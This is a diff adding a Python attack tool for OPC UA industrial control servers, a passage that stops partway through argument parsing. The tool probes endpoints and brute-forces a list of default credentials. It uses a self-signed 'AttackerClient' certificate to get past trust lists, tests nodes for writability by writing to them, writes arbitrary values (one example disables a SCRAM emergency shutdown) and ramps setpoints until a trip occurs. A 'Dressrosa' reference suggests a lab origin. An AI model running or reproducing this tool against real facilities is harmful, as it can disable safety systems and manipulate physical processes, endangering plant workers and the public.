@@ -1,0 +1,990 @@
+#!/usr/bin/env python3
+"""
+╔═══════════════════════════════════════════════════════╗
+║         OPC UA Recon Tool v2 — CoreFlareSec          ║
+║         Generic ICS/SCADA Enumeration & Attack       ║
+║         Usage: python3 opcua_recon.py -h             ║
+╚═══════════════════════════════════════════════════════╝
+"""
+
+import asyncio
+import argparse
+import json
+import logging
+import sys
+from datetime import datetime
+
+logging.disable(logging.CRITICAL)
+
+try:
+    from asyncua import Client, ua
+except ImportError:
+    print("[-] Missing dependency: pip3 install asyncua")
+    sys.exit(1)
+
+# ─── Color Scheme ─────────────────────────────────────────────────────────────
+#
+#  CYAN    = Info / Status / Connection
+#  GREEN   = Success / Writable / Found
+#  YELLOW  = Warning / Unknown / Requires action
+#  RED     = Vulnerability / Failed / Dangerous
+#  MAGENTA = Node value / Data
+#  BLUE    = Mode header / Section
+#  WHITE   = Normal text
+#  BOLD    = Important labels
+#
+C_CYAN    = "\033[96m"
+C_GREEN   = "\033[92m"
+C_YELLOW  = "\033[93m"
+C_RED     = "\033[91m"
+C_NEON    = "\033[92m"  # bright green (neon) for values
+C_BLUE    = "\033[94m"
+C_BOLD    = "\033[1m"
+C_RESET   = "\033[0m"
+
+def cyan(s):    return f"{C_CYAN}{s}{C_RESET}"
+def green(s):   return f"{C_GREEN}{s}{C_RESET}"
+def yellow(s):  return f"{C_YELLOW}{s}{C_RESET}"
+def red(s):     return f"{C_RED}{s}{C_RESET}"
+def neon(s):    return f"{C_NEON}{s}{C_RESET}"
+def blue(s):    return f"{C_BLUE}{s}{C_RESET}"
+def bold(s):    return f"{C_BOLD}{s}{C_RESET}"
+
+# ─── Constants ─────────────────────────────────────────────────────────────────
+
+# Default cert paths (auto-used when --cert/--key not specified)
+DEFAULT_CERT = "certificate.der"
+DEFAULT_KEY  = "private-key.pem"
+CERT_PEM     = "certificate.pem"
+
+# Gen cert command (shown when cert missing)
+GEN_CERT_CMD = """
+    openssl req -x509 -newkey rsa:2048 -keyout private-key.pem \\
+      -out certificate.pem -days 365 -nodes \\
+      -subj '/CN=AttackerClient/O=CoreFlareSec/C=TH'
+    openssl x509 -in certificate.pem -outform DER -out certificate.der"""
+
+DEFAULT_CREDS = [
+    ("", ""),
+    ("admin", "admin"),
+    ("operator", "operator"),
+    ("operator", "operator1"),
+    ("user", "password"),
+    ("guest", "guest"),
+    ("root", "root"),
+    ("administrator", "administrator"),
+    ("admin", "password"),
+    ("admin", "1234"),
+    ("user", "user"),
+    ("scada", "scada"),
+    ("plc", "plc"),
+]
+
+SECURITY_POLICIES = {
+    "none":         ("None",             None),
+    "sign":         ("Basic256Sha256",   "Sign"),
+    "sign-encrypt": ("Basic256Sha256",   "SignAndEncrypt"),
+}
+
+BANNER = """
+  ██████╗ ██████╗  ██████╗    ██╗   ██╗ █████╗ 
+ ██╔═══██╗██╔══██╗██╔════╝    ██║   ██║██╔══██╗
+ ██║   ██║██████╔╝██║         ██║   ██║███████║
+ ██║   ██║██╔═══╝ ██║         ██║   ██║██╔══██║
+ ╚██████╔╝██║     ╚██████╗    ╚██████╔╝██║  ██║
+  ╚═════╝ ╚═╝      ╚═════╝    ╚═════╝ ╚═╝  ╚═╝
+  OPC UA Recon Tool v2 — CoreFlareSec ICS Security
+"""
+
+HELP_TEXT = r"""
+╔══════════════════════════════════════════════════════════════════╗
+║           OPC UA Recon Tool v2 — CoreFlareSec ICS Security      ║
+╠══════════════════════════════════════════════════════════════════╣
+║  USAGE                                                           ║
+║    python3 opcua_recon.py <url> [options]                        ║
+║                                                                  ║
+║  MODES  (-m)                                                     ║
+║    info      Discover endpoints + security policy (START HERE)   ║
+║    enum      Enumerate all nodes as tree (default)               ║
+║    brute     Bruteforce credentials                              ║
+║    writable  Find all writable nodes                             ║
+║    read      Read value of a specific node                       ║
+║    write     Write value to a specific node                      ║
+║    monitor   Live monitor nodes (like tail -f)                   ║
+║    ramp      Auto-ramp a node value with trip detection          ║
+║                                                                  ║
+║  SECURITY OPTIONS                                                ║
+║    --security  none         No encryption (default)              ║
+║                sign         Basic256Sha256 + Sign                ║
+║                sign-encrypt Basic256Sha256 + SignAndEncrypt ✓    ║
+║                auto         Try None → Sign → SignAndEncrypt     ║
+║                             AUTO-GEN cert if not found           ║
+║    --cert      Path to certificate.der  (default: certificate.der)║
+║    --key       Path to private-key.pem  (default: private-key.pem)║
+║                                                                  ║
+║  CERT — AUTO-GENERATED when needed (no manual step required)     ║
+║  Or generate manually:                                           ║
+║    openssl req -x509 -newkey rsa:2048 -keyout private-key.pem   ║
+║      -out certificate.pem -days 365 -nodes                      ║
+║      -subj "/CN=AttackerClient/O=CoreFlareSec/C=TH"             ║
+║    openssl x509 -in certificate.pem -outform DER                ║
+║      -out certificate.der                                        ║
+║                                                                  ║
+║  OPTIONS                                                         ║
+║    -u  --user          Username (default: anonymous)             ║
+║    -p  --password      Password                                  ║
+║    -n  --nodeid        NodeID e.g. "ns=2;i=12"                   ║
+║    -v  --value         Value to write                            ║
+║    -t  --type          Data type: str, bool, int, float          ║
+║    -w  --wordlist      Credential wordlist (user:pass per line)  ║
+║    -i  --interval      Monitor interval seconds (default: 2)     ║
+║    -o  --output        Save enum results to JSON file            ║
+║    --ns                Filter enum by namespace index            ║
+║    --monitor-nodes     NodeIDs to monitor (space separated)      ║
+║                                                                  ║
+║  WORKFLOW                                                        ║
+║    Step 1: info        → discover endpoint + security policy     ║
+║    Step 2: brute/cert  → authenticate                            ║
+║    Step 3: enum        → browse node tree                        ║
+║    Step 4: writable    → find writable nodes                     ║
+║    Step 5: write/ramp  → exploit                                 ║
+║                                                                  ║
+║  EXAMPLES                                                        ║
+║    # Step 1: discover endpoints (always start here)              ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m info     ║
+║                                                                  ║
+║    # Anonymous enum                                              ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m enum     ║
+║                                                                  ║
+║    # Auto security (try None → cert fallback)                    ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m enum     ║
+║        --security auto --cert certificate.der --key private-key.pem
+║                                                                  ║
+║    # Cert-based enum (Dressrosa style)                           ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m enum     ║
+║        --security sign-encrypt                                   ║
+║        --cert certificate.der --key private-key.pem             ║
+║                                                                  ║
+║    # Enum only namespace 2                                       ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ --ns 2      ║
+║                                                                  ║
+║    # Bruteforce credentials                                      ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m brute    ║
+║                                                                  ║
+║    # Write bool (disable SCRAM)                                  ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m write    ║
+║        -n "ns=2;i=41" -v "false" -t bool                        ║
+║        --security sign-encrypt                                   ║
+║        --cert certificate.der --key private-key.pem             ║
+║                                                                  ║
+║    # Monitor nodes                                               ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m monitor  ║
+║        --monitor-nodes "ns=2;i=41" "ns=2;i=38" -i 1             ║
+║                                                                  ║
+║    # Ramp with trip detection                                    ║
+║    python3 opcua_recon.py opc.tcp://127.0.0.1:4840/ -m ramp     ║
+║        -n "ns=2;i=6" --ramp-start 0 --ramp-end 30 --ramp-step 2 ║
+║        --trip-nodeid "ns=2;i=10" -i 3                            ║
+╚══════════════════════════════════════════════════════════════════╝
+"""
+
+# ─── Cert helper ─────────────────────────────────────────────────────────────
+
+import os, subprocess
+
+def gen_default_cert():
+    """Auto-generate self-signed cert if not exists"""
+    if os.path.exists(DEFAULT_CERT) and os.path.exists(DEFAULT_KEY):
+        return True, "existing"
+
+    print(f"  {cyan("[*]")} gen cert — generating self-signed certificate...")
+    try:
+        # Step 1: generate key + PEM cert
+        r1 = subprocess.run([
+            "openssl", "req", "-x509", "-newkey", "rsa:2048",
+            "-keyout", DEFAULT_KEY,
+            "-out", CERT_PEM,
+            "-days", "365", "-nodes",
+            "-subj", "/CN=AttackerClient/O=CoreFlareSec/C=TH"
+        ], capture_output=True)
+        if r1.returncode != 0:
+            print(f"[-] openssl step1 failed: {r1.stderr.decode()[:100]}")
+            return False, "gen_failed"
+
+        # Step 2: convert PEM → DER
+        r2 = subprocess.run([
+            "openssl", "x509", "-in", CERT_PEM,
+            "-outform", "DER", "-out", DEFAULT_CERT
+        ], capture_output=True)
+        if r2.returncode != 0:
+            print(f"[-] openssl step2 failed: {r2.stderr.decode()[:100]}")
+            return False, "convert_failed"
+
+        print(f"  {green("[cert]")  } generated: {DEFAULT_CERT} + {DEFAULT_KEY} ✓")
+        return True, "generated"
+
+    except FileNotFoundError:
+        print(f"[-] openssl not found — install: sudo apt install openssl -y")
+        print(f"[*] Manual cert generation:{GEN_CERT_CMD}")
+        return False, "openssl_missing"
+
+
+def get_cert_paths(cert=None, key=None, auto_gen=True):
+    """
+    Return (cert_path, key_path) — auto-gen if needed
+    priority: --cert/--key args → DEFAULT_CERT → auto-gen
+    """
+    c = cert or DEFAULT_CERT
+    k = key  or DEFAULT_KEY
+
+    if os.path.exists(c) and os.path.exists(k):
+        return c, k, "existing"
+
+    if auto_gen:
+        ok, status = gen_default_cert()
+        if ok:
+            return DEFAULT_CERT, DEFAULT_KEY, status
+        return None, None, status
+
+    return None, None, "not_found"
+
+
+# ─── Connect helpers ──────────────────────────────────────────────────────────
+
+async def try_connect(url, user="", password="", timeout=5):
+    """Anonymous or username/password connect"""
+    client = Client(url=url, timeout=timeout)
+    client.load_type_definitions = False
+    if user:
+        client.set_user(user)
+        client.set_password(password)
+    try:
+        await client.connect()
+        return client
+    except Exception:
+        try:
+            await client.disconnect()
+        except:
+            pass
+        return None
+
+
+async def try_connect_cert(url, cert, key, mode_str="sign-encrypt", timeout=5):
+    """Certificate-based connect — bypass Trust List"""
+    try:
+        from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
+        from asyncua.ua import MessageSecurityMode
+    except ImportError:
+        print("[-] Missing: pip3 install asyncua[crypto] cryptography")
+        return None, None
+
+    mode_map = {
+        "sign":         MessageSecurityMode.Sign,
+        "sign-encrypt": MessageSecurityMode.SignAndEncrypt,
+    }
+    mode = mode_map.get(mode_str, MessageSecurityMode.SignAndEncrypt)
+
+    client = Client(url=url, timeout=timeout)
+    client.load_type_definitions = False
+    try:
+        await client.set_security(
+            SecurityPolicyBasic256Sha256,
+            certificate=cert,
+            private_key=key,
+            mode=mode
+        )
+        await client.connect()
+        return client, mode_str
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except:
+            pass
+        return None, str(e)
+
+
+async def auto_connect(url, cert=None, key=None, user="", password="", timeout=5):
+    """
+    Auto security fallback:
+    1. Try anonymous (SecurityPolicy#None)
+    2. Auto-gen cert if needed → Try Sign → SignAndEncrypt
+    Returns (client, method_used) or (None, error)
+    """
+    # Step 1: anonymous
+    print(f"  {cyan("[*]")} try anonymous...", end=" ", flush=True)
+    client = await try_connect(url, user, password, timeout)
+    if client:
+        print("OK")
+        return client, "anonymous"
+    print("failed")
+
+    # Step 2-3: cert-based — auto-gen if not exists
+    cert_path, key_path, cert_status = get_cert_paths(cert, key, auto_gen=True)
+    if not cert_path:
+        return None, "cert gen failed"
+
+    print(f"  {cyan("[*]")} using cert [{cert_status}]: {bold(cert_path)}")
+    for mode in ["sign", "sign-encrypt"]:
+        print(f"[+] try cert mode={mode}...", end=" ", flush=True)
+        client, result = await try_connect_cert(url, cert_path, key_path, mode, timeout)
+        if client:
+            print("OK")
+            return client, f"cert/{mode}"
+        print(f"failed")
+
+    return None, "all methods failed"
+
+# ─── Mode 1: Info / Endpoint Discovery ───────────────────────────────────────
+
+async def mode_info(url, cert=None, key=None):
+    """Discover endpoints, security policies, and auth methods"""
+    print(f"\n{bold(blue("[*]"))} {cyan("Endpoint Discovery")} — {bold(url)}")
+    SEP = "─" * 60
+    print(SEP)
+
+    eps = None
+
+    # Method 1: anonymous connect
+    try:
+        client = Client(url=url, timeout=5)
+        client.load_type_definitions = False
+        await client.connect()
+        eps = await client.get_endpoints()
+        await client.disconnect()
+        print(f"  {green("[anon]")  } connected ✓")
+    except Exception as e:
+        print(f"  {yellow("[anon]")  } failed — {e}")
+
+    # Method 2: cert connect (auto-gen if not exists)
+    if not eps:
+        cert_path, key_path, cert_status = get_cert_paths(cert, key, auto_gen=True)
+        if cert_path and key_path:
+            print(f"  {cyan("[cert]")  } using: {cert_path} [{cert_status}]")
+            try:
+                from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
+                from asyncua.ua import MessageSecurityMode
+                for mode in [MessageSecurityMode.Sign, MessageSecurityMode.SignAndEncrypt]:
+                    mode_name = "Sign" if mode == MessageSecurityMode.Sign else "SignAndEncrypt"
+                    try:
+                        client2 = Client(url=url, timeout=5)
+                        client2.load_type_definitions = False
+                        await client2.set_security(
+                            SecurityPolicyBasic256Sha256,
+                            certificate=cert_path,
+                            private_key=key_path,
+                            mode=mode
+                        )
+                        await client2.connect()
+                        eps = await client2.get_endpoints()
+                        await client2.disconnect()
+                        print(f"[+] Got endpoints via cert mode={mode_name}")
+                        break
+                    except Exception as em:
+                        print(f"[*] cert mode={mode_name} failed: {em}")
+            except Exception as e3:
+                print(f"[-] Cert discovery failed: {e3}")
+        else:
+            print(f"[-] Cert generation failed")
+            print(f"[*] Manual cert generation:{GEN_CERT_CMD}")
+
+    if not eps:
+        print(f"\n[-] Cannot discover endpoints — try:")
+        print(f"    python3 opcua_recon.py {url} -m info --cert certificate.der --key private-key.pem")
+        return
+
+    SEP2 = "─" * 60
+    print(f"\n[+] Found {len(eps)} endpoint(s):\n")
+
+    has_none     = False
+    has_sign     = False
+    has_signenc  = False
+    has_anon     = False
+    has_user     = False
+    has_cert_tok = False
+    connect_method = ""  # track how we connected
+
+    for i, ep in enumerate(eps):
+        policy = ep.SecurityPolicyUri.split("#")[-1]
+        mode_raw = str(ep.SecurityMode)
+        mode_num = mode_raw.split(".")[-1]
+        # map mode number to name
+        mode_name = {"1":"None","2":"Sign","3":"SignAndEncrypt"}.get(mode_num, mode_num)
+        tokens = []
+        for t in ep.UserIdentityTokens:
+            tok = str(t.TokenType).split(".")[-1]
+            tokens.append(tok)
+            if tok == "Anonymous":  has_anon     = True
+            if tok == "UserName":   has_user     = True
+            if tok == "Certificate":has_cert_tok = True
+
+        if policy == "None":             has_none    = True
+        if mode_name == "Sign":          has_sign    = True
+        if mode_name == "SignAndEncrypt": has_signenc = True
+
+        # Use original URL not internal IP
+        print(f"  {cyan("[endpoint]")} [{i+1}]")
+        print(f"    {bold("URL"):12}: {cyan(url)}")
+        print(f"    {bold("Security"):12}: {yellow(policy)}")
+        print(f"    {bold("Mode"):12}: {yellow(mode_name)}")
+        print(f"    {bold("Auth"):12}: {cyan(', '.join(tokens)) if tokens else yellow("unknown")}")
+        print()
+
+    # ── Security Analysis ─────────────────────────────────────────
+    print(SEP2)
+    print(f"{bold(blue("[*]"))} {bold("Security Analysis")}\n")
+
+    # Anonymous check
+    if has_none and has_anon:
+        print(f"  anonymous    : {red("ACCESSIBLE")}  ← no auth required")
+    else:
+        print(f"  anonymous    : {green("checked")}     (blocked)")
+
+    # Certificate check
+    if has_sign or has_signenc:
+        print(f"  certificate  : {yellow("required")}    (Basic256Sha256)")
+    else:
+        print(f"  certificate  : {green("checked")}     (not required)")
+
+    # ACL check (can only determine after connect + write attempt)
+    print(f"  access_ctrl  : {yellow("unknown")}     (need enum + write test)")
+    print(f"  trust_list   : {yellow("unknown")}     (need connect with self-signed cert)")
+
+    # Vulnerability summary
+    print(f"\n[*] Vulnerability Assessment:")
+    if has_none and has_anon:
+        print(f"  {red("[VULN]")} SecurityPolicy#None + Anonymous → {red("read/write without auth")}")
+    if has_sign or has_signenc:
+        print(f"  {yellow("[INFO]")} Certificate required BUT {yellow("trust list may not validate self-signed")}")
+        print(f"         → try self-signed cert bypass (Dressrosa pattern)")
+    if not has_anon and not has_user and not has_cert_tok:
+        print(f"  \033[33m[INFO]\033[0m No user identity tokens found in endpoint")
+
+    # ── Recommendations ───────────────────────────────────────────
+    print(f"\n{SEP2}")
+    print(f"\n{bold(blue("[*]"))} {bold("Next Steps")}\n")
+
+    if has_none and has_anon:
+        print(f"  [1] Enum nodes (anonymous):")
+        print(f"      python3 opcua_recon.py {url} -m enum")
+        print(f"  [2] Find writable nodes:")
+        print(f"      python3 opcua_recon.py {url} -m writable")
+
+    if has_sign or has_signenc:
+        mode_flag = "sign-encrypt" if has_signenc else "sign"
+        print(f"  [1] Enum with cert (auto-gen):")
+        print(f"      python3 opcua_recon.py {url} -m enum --security {mode_flag}")
+        print(f"  [2] Find writable nodes:")
+        print(f"      python3 opcua_recon.py {url} -m writable --security {mode_flag}")
+
+    if has_user:
+        print(f"  [3] Bruteforce credentials:")
+        print(f"      python3 opcua_recon.py {url} -m brute")
+
+    if not has_none and not has_sign and not has_signenc:
+        print(f"  [?] Unknown — try auto mode:")
+        print(f"      python3 opcua_recon.py {url} -m enum --security auto")
+
+
+# ─── Mode 2: Bruteforce ───────────────────────────────────────────────────────
+
+async def mode_bruteforce(url, wordlist=None):
+    creds = list(DEFAULT_CREDS)
+    if wordlist:
+        try:
+            with open(wordlist) as f:
+                for line in f:
+                    parts = line.strip().split(":", 1)
+                    creds.append((parts[0], parts[1] if len(parts) > 1 else ""))
+        except Exception as e:
+            print(f"[-] Cannot read wordlist: {e}")
+
+    print(f"\n[*] Bruteforcing credentials on {url}")
+    print(f"{'─'*50}")
+
+    found = []
+    for user, pwd in creds:
+        label = "anonymous" if not user else f"{user}:{pwd}"
+        client = await try_connect(url, user, pwd)
+        if client:
+            print(f"  {green("[+]")} {green("Found")}  → {bold(label)}")
+            found.append((user, pwd))
+            await client.disconnect()
+        else:
+            print(f"  {red("[-]")  } Failed → {label}")
+
+    print(f"\n[*] Found {len(found)} valid credential(s)")
+    for u, p in found:
+        print(f"  → {u}:{p}" if u else "  → anonymous")
+    return found
+
+
+# ─── Mode 3: Enumerate nodes ─────────────────────────────────────────────────
+
+async def mode_enum(url, user="", password="", output=None, ns_filter=None,
+                    cert=None, key=None, security="none"):
+    print(f"\n[*] Enumerating nodes on {url}")
+    if ns_filter is not None:
+        print(f"[*] Namespace filter: ns={ns_filter}")
+    print(f"{'─'*50}")
+
+    # connect
+    client = await _connect_by_security(url, security, cert, key, user, password)
+    if not client:
+        print("[-] Connection failed")
+        return
+
+    nodes = []
+
+    async def tree_browse(node, prefix="", filter_ns=None):
+        try:
+            children = await node.get_children()
+            for i, child in enumerate(children):
+                last = (i == len(children) - 1)
+                connector = "└── " if last else "├── "
+                try:
+                    ns_idx = child.nodeid.NamespaceIndex
+                    if filter_ns is not None and ns_idx != filter_ns:
+                        await tree_browse(child, prefix + ("    " if last else "│   "), filter_ns)
+                        continue
+
+                    name   = (await child.read_browse_name()).Name
+                    nodeid = child.nodeid.to_string()
+                    try:
+                        val      = await child.read_value()
+                        datatype = type(val).__name__
+                        print(f"{prefix}{connector}{cyan("["+nodeid+"]")} {bold(name)} = {neon(repr(val))}")
+                        nodes.append({"nodeid":nodeid,"name":name,"value":str(val),
+                                      "type":datatype,"ns":ns_idx,"writable":None})
+                    except:
+                        print(f"{prefix}{connector}{cyan("["+nodeid+"]")} {blue(name+"/")}")
+                        nodes.append({"nodeid":nodeid,"name":name,"value":None,
+                                      "type":"folder","ns":ns_idx,"writable":None})
+                    ext = "    " if last else "│   "
+                    await tree_browse(child, prefix + ext, filter_ns)
+                except:
+                    pass
+        except:
+            pass
+
+    try:
+        ns_array = await client.get_namespace_array()
+        print("\n[*] Namespaces:")
+        for i, ns in enumerate(ns_array):
+            marker = " ◄" if ns_filter is not None and i == ns_filter else ""
+            print(f"  [{i}] {ns}{marker}")
+
+        if ns_filter is not None:
+            print(f"\n[*] Node Tree (ns={ns_filter}):")
+            root     = client.get_objects_node()
+            children = await root.get_children()
+            found    = False
+            for child in children:
+                if child.nodeid.NamespaceIndex == ns_filter:
+                    found = True
+                    name   = (await child.read_browse_name()).Name
+                    nodeid = child.nodeid.to_string()
+                    print(f"└── [{nodeid}] {name}/")
+                    await tree_browse(child, "    ", ns_filter)
+            if not found:
+                await tree_browse(client.get_objects_node(), "", ns_filter)
+        else:
+            print("\n[*] Node Tree (all namespaces):")
+            root     = client.get_objects_node()
+            children = await root.get_children()
+            for child in children:
+                name   = (await child.read_browse_name()).Name
+                nodeid = child.nodeid.to_string()
+                print(f"└── [{nodeid}] {name}/")
+                await tree_browse(child, "    ")
+
+    finally:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+    if output:
+        with open(output, "w") as f:
+            json.dump(nodes, f, indent=2)
+        print(f"\n[+] Saved {len(nodes)} nodes → {output}")
+
+    return nodes
+
+
+# ─── Mode 4: Check writable nodes ────────────────────────────────────────────
+
+async def mode_writable(url, user="", password="", cert=None, key=None, security="none", ns_filter=None):
+    ns_info = f" (ns={ns_filter})" if ns_filter is not None else ""
+    print(f"\n{bold(blue("[*]"))} Checking {green("writable")} nodes on {cyan(url)}{ns_info}")
+    print(f"{'─'*50}")
+
+    client = await _connect_by_security(url, security, cert, key, user, password)
+    if not client:
+        print("[-] Connection failed")
+        return
+
+    writable = []
+
+    async def check_write(node, in_ns=False):
+        try:
+            children = await node.get_children()
+            for child in children:
+                try:
+                    ns_idx = child.nodeid.NamespaceIndex
+                    name   = (await child.read_browse_name()).Name
+                    nodeid = child.nodeid.to_string()
+
+                    # ถ้ามี ns_filter: ต้องอยู่ใน ns ที่ถูกต้อง
+                    # in_ns=True = อยู่ใต้ parent ที่ ns ตรงแล้ว
+                    matched = (ns_filter is None) or (ns_idx == ns_filter) or in_ns
+
+                    if not matched:
+                        # ลงไปหา node ที่ ns ตรงใน subtree ต่อ
+                        await check_write(child, in_ns=False)
+                        continue
+
+                    try:
+                        val = await child.read_value()
+                        try:
+                            dv = await child.read_data_value()
+                            await child.write_value(dv)
+                            print(f"  {green("[W]")} {cyan(nodeid)} {bold(name)} = {neon(repr(val))}")
+                            writable.append({"nodeid":nodeid,"name":name,"value":str(val)})
+                        except:
+                            print(f"  {yellow("[R]")} {cyan(nodeid)} {name} = {repr(val)}")
+                    except:
+                        print(f"  {blue("[F]")} {cyan(nodeid)} {blue(name+"/")}")
+
+                    # ลงลึกต่อ — ถ้า ns ตรงแล้ว force in_ns=True ทั้ง subtree
+                    await check_write(child, in_ns=(ns_filter is None or ns_idx == ns_filter or in_ns))
+                except:
+                    pass
+        except:
+            pass
+
+    try:
+        await check_write(client.get_objects_node(), in_ns=False)
+    finally:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+    print(f"\n{green("[+]")} Found {bold(str(len(writable)))} writable node(s)")
+    for w in writable:
+        print(f"  {green("[W]")} {cyan(w['nodeid'])} {bold(w['name'])} = {neon(w['value'])}")
+    return writable
+
+
+# ─── Mode 5: Read node ────────────────────────────────────────────────────────
+
+async def mode_read(url, nodeid, user="", password="", cert=None, key=None, security="none"):
+    client = await _connect_by_security(url, security, cert, key, user, password)
+    if not client:
+        print("[-] Connection failed")
+        return
+
+    try:
+        node = client.get_node(nodeid)
+        val  = await node.read_value()
+        name = (await node.read_browse_name()).Name
+        print(f"\n[+] [{nodeid}] {name} = {repr(val)}  (type: {type(val).__name__})")
+    except Exception as e:
+        print(f"[-] Cannot read {nodeid}: {e}")
+    finally:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+
+# ─── Mode 6: Write node ───────────────────────────────────────────────────────
+
+async def mode_write(url, nodeid, value, datatype, user="", password="",
+                     cert=None, key=None, security="none"):
+    client = await _connect_by_security(url, security, cert, key, user, password)
+    if not client:
+        print("[-] Connection failed")
+        return
+
+    # type conversion
+    type_map = {
+        "bool":   (lambda v: v.lower() in ("true","1","yes","on"), ua.VariantType.Boolean),
+        "int":    (int,   ua.VariantType.Int64),
+        "float":  (float, ua.VariantType.Double),
+        "double": (float, ua.VariantType.Double),
+        "str":    (str,   ua.VariantType.String),
+        "string": (str,   ua.VariantType.String),
+    }
+    conv, vtype = type_map.get(datatype.lower(), (str, ua.VariantType.String))
+    try:
+        converted = conv(value)
+    except Exception as e:
+        print(f"[-] Cannot convert value: {e}")
+        return
+
+    try:
+        node = client.get_node(nodeid)
+        old  = await node.read_value()
+        await node.write_value(ua.DataValue(ua.Variant(converted, vtype)))
+        new  = await node.read_value()
+        print(f"\n[+] Written [{nodeid}]")
+        print(f"    Before: {repr(old)}")
+        print(f"    After:  {repr(new)}")
+    except Exception as e:
+        print(f"[-] Write failed: {e}")
+    finally:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+
+# ─── Mode 7: Monitor nodes ────────────────────────────────────────────────────
+
+async def mode_monitor(url, nodeids, interval=2, user="", password="",
+                       cert=None, key=None, security="none"):
+    print(f"\n[*] Monitoring {len(nodeids)} node(s) every {interval}s  (Ctrl+C stop)")
+    print(f"{'─'*60}")
+
+    client = await _connect_by_security(url, security, cert, key, user, password)
+    if not client:
+        print("[-] Connection failed")
+        return
+
+    nodes = [client.get_node(nid) for nid in nodeids]
+    names = []
+    for node in nodes:
+        try:
+            names.append((await node.read_browse_name()).Name)
+        except:
+            names.append("?")
+
+    # header
+    hdr = f"{'TIME':>10}"
+    for name in names:
+        hdr += f" | {name[:12]:>12}"
+    print(hdr)
+    print("─" * (12 + len(nodes)*16))
+
+    prev = {}
+    try:
+        while True:
+            ts  = datetime.now().strftime("%H:%M:%S")
+            row = f"{ts:>10}"
+            for i, node in enumerate(nodes):
+                try:
+                    val = await node.read_value()
+                    p   = prev.get(i)
+                    tag = f"*{val}*" if (p is not None and p != val) else str(val)
+                    row += f" | {str(tag)[:12]:>12}"
+                    prev[i] = val
+                except:
+                    row += f" | {'ERR':>12}"
+            print(row)
+            await asyncio.sleep(interval)
+    except KeyboardInterrupt:
+        print("\n[*] Monitor stopped")
+    finally:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+
+# ─── Mode 8: Ramp ─────────────────────────────────────────────────────────────
+
+async def mode_ramp(url, nodeid, start, end, step, interval,
+                    trip_nodeid=None, threshold=None, user="", password="",
+                    cert=None, key=None, security="none"):
+    print(f"\n[*] Ramping [{nodeid}] from {start} to {end} step={step} interval={interval}s")
+    if trip_nodeid:
+        print(f"[*] Trip monitor: [{trip_nodeid}] threshold={threshold}")
+    print(f"{'─'*60}")
+
+    client = await _connect_by_security(url, security, cert, key, user, password)
+    if not client:
+        print("[-] Connection failed")
+        return
+
+    try:
+        node      = client.get_node(nodeid)
+        trip_node = client.get_node(trip_nodeid) if trip_nodeid else None
+        val       = float(start)
+
+        print(f"{'Value':>8} | {'Time':>10} | {'Trip/Status':>12}")
+        print(f"{'─'*40}")
+
+        while val <= float(end):
+            await node.write_value(ua.DataValue(ua.Variant(val, ua.VariantType.Double)))
+            ts = datetime.now().strftime("%H:%M:%S")
+
+            status = "OK"
+            if trip_node:
+                try:
+                    trip_val = await trip_node.read_value()
+                    if threshold is not None:
+                        if isinstance(trip_val, bool):
+                            status = "TRIP!" if trip_val else "OK"
+                        else:
+                            status = "TRIP!" if float(trip_val) >= float(threshold) else f"{trip_val:.2f}"
+                except:
+                    status = "ERR"
+
+            print(f"{val:>8.1f} | {ts:>10} | {status:>12}")
+            if status == "TRIP!":
+                print(f"\n[!] Trip at value={val} — stopping")
+                break
+
+            val = round(val + float(step), 4)
+            await asyncio.sleep(float(interval))
+
+        print(f"\n[*] Ramp complete")
+
+    except KeyboardInterrupt:
+        print("\n[*] Ramp stopped")
+    except Exception as e:
+        print(f"[-] {e}")
+    finally:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+
+# ─── Security connect helper ──────────────────────────────────────────────────
+
+async def _connect_by_security(url, security, cert, key, user, password):
+    """Connect using specified security mode"""
+    if security == "auto":
+        client, method = await auto_connect(url, cert, key, user, password)
+        if client:
+            print(f"{green("[+]")} Connected {bold(method)}")
+        else:
+            print(f"{red("[-]")} All methods failed")
+        return client
+
+    elif security in ("sign", "sign-encrypt"):
+        # auto-gen cert if not specified
+        cert_path, key_path, cert_status = get_cert_paths(cert, key, auto_gen=True)
+        if not cert_path:
+            print(f"[-] Cert required for {security} mode but not available")
+            return None
+        print(f"[+] Using cert [{cert_status}]: {cert_path}")
+        client, result = await try_connect_cert(url, cert_path, key_path, security)
+        if client:
+            print(f"{green("[+]")} Connected {bold(security)}")
+        else:
+            print(f"{red("[-]")} Connection failed: {result}")
+        return client
+
+    else:  # none (default)
+        client = await try_connect(url, user, password)
+        if client:
+            print(f"{green("[+]")} Connected {bold("none")}")
+        return client
+
+
+# ─── CLI ─────────────────────────────────────────────────────────────────────
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="OPC UA Recon Tool v2 — CoreFlareSec",
+        formatter_class=argparse.RawTextHelpFormatter,
+        add_help=False
+    )
+    parser.add_argument("url",        nargs="?")
+    parser.add_argument("-h","--help",action="store_true")
+    parser.add_argument("-m","--mode",default="enum",
+        choices=["info","enum","brute","writable","read","write","monitor","ramp"])
+    parser.add_argument("-u","--user",      default="")
+    parser.add_argument("-p","--password",  default="")
+    parser.add_argument("-n","--nodeid",    help="NodeID e.g. ns=2;i=12")
+    parser.add_argument("-v","--value",     help="Value to write")
+    parser.add_argument("-t","--type",      default="str",
+        help="Data type: str, bool, int, float")
+    parser.add_argument("-w","--wordlist",  help="Credential wordlist")
+    parser.add_argument("-i","--interval",  type=float, default=2)
+    parser.add_argument("-o","--output",    help="Save enum to JSON")
+    parser.add_argument("--ns",             type=int, default=None)
+    parser.add_argument("--monitor-nodes",  nargs="+")
+    parser.add_argument("--ramp-start",     type=float, default=0)
+    parser.add_argument("--ramp-end",       type=float, default=50)
